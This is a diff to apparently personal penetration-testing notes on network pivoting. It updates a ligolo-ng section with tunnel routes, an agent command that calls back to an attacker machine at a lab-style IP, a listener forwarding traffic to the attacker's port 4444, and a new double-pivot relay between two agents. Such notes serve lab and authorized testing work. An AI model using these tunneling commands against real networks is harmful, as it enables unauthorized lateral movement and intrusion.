@@ -98,6 +98,7 @@ Tip:
 Using chisel to do one reverse port forwarding, doesn't have to use proxychains4 
 ```
 ###### ligolo-ng
+![image](https://github.com/user-attachments/assets/66ad772e-0f66-4a10-b3c3-29e3fbcc9edf)
 Proxy:attacker machine
 ```
 Settingup:
@@ -108,18 +109,23 @@ sudo ip link set ligolo up
 Setting up tunnel:
 session
 sudo ip route add 172.16.5.0/24 dev ligolo
+sudo ip route add 172.16.6.0/24 dev ligolo
 ```
 Agent:linux
 ```
-./agent -connect attacker-ip:11601 -ignore-cert
+./agent -connect 10.10.14.213:11601 -ignore-cert
 start
 listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444
 # Creates a listener on the machine where we're running the agent at port 1234
 # and redirects the traffic to port 4444 on attacker machine.
 # You can use other ports, of course.
 ```
-Agent:windows
+Double Pivot
 ```
+agent_1:listener_add --addr 0.0.0.0:11601 --to 0.0.0.0:11601
+agent_2:/agent.exe -connect 172.16.5.15:11601 -ignore-cert
+
+Once again, ligolo-ng will tell us that an agent has joined. We can use the session command as before to switch to the new session and then start to begin a tunnel over that connection instead.
 ```
 ### Windows Port forwarding
 ###### PLINK.exe
